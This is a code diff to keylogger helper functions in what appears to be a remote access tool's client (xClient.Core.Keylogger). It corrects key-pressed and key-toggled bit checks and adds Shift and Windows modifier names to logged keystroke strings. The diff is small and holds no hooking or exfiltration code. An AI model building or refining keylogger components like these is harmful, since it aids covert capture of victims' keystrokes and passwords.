@@ -4,6 +4,7 @@ using System.Text;
 using System.Reflection;
 using xClient.Core.Keylogger;
 using System.Runtime.CompilerServices;
+using System.Windows.Forms;
 
 namespace xClient.Core.Keylogger
 {
@@ -92,7 +93,7 @@ namespace xClient.Core.Keylogger
         /// <returns>True if key is pressed; False if the key is not.</returns>
         public static bool IsKeyPressed(this short sender)
         {
-            return (sender & 0x8000) == 0x8000;
+            return (sender & 0x8000) != 0;
         }
 
         /// <summary>
@@ -102,7 +103,7 @@ namespace xClient.Core.Keylogger
         /// <returns>True if toggled on; False if toggled off.</returns>
         public static bool IsKeyToggled(this short sender)
         {
-            return (sender & 0xffff) == 0xffff;
+            return (sender & 0x0001) != 0;
         }
 
         public static string BuildString(this KeyloggerModifierKeys sender)
@@ -118,14 +119,28 @@ namespace xClient.Core.Keylogger
                     string CtrlName = KeyloggerKeys.VK_CONTROL.GetKeyloggerKeyName();
 
                     if (!string.IsNullOrEmpty(CtrlName))
-                        BuiltModifierKeys.Append(CtrlName + " +");
+                        BuiltModifierKeys.Append(CtrlName + " + ");
                 }
                 if (sender.AltKeyPressed)
                 {
                     string AltName = KeyloggerKeys.VK_MENU.GetKeyloggerKeyName();
 
                     if (!string.IsNullOrEmpty(AltName))
-                        BuiltModifierKeys.Append(" " + AltName + " +");
+                        BuiltModifierKeys.Append(AltName + " + ");
+                }
+                if (sender.ShiftKeyPressed)
+                {
+                    string ShiftName = KeyloggerKeys.VK_SHIFT.GetKeyloggerKeyName();
+
+                    if (!string.IsNullOrEmpty(ShiftName))
+                        BuiltModifierKeys.Append(ShiftName + " + ");
+                }
+                if (sender.WindowsKeyPressed)
+                {
+                    string WinName = KeyloggerKeys.VK_LWIN.GetKeyloggerKeyName();
+
+                    if (!string.IsNullOrEmpty(WinName))
+                        BuiltModifierKeys.Append(WinName + " + ");
                 }
 
                 return BuiltModifierKeys.ToString();
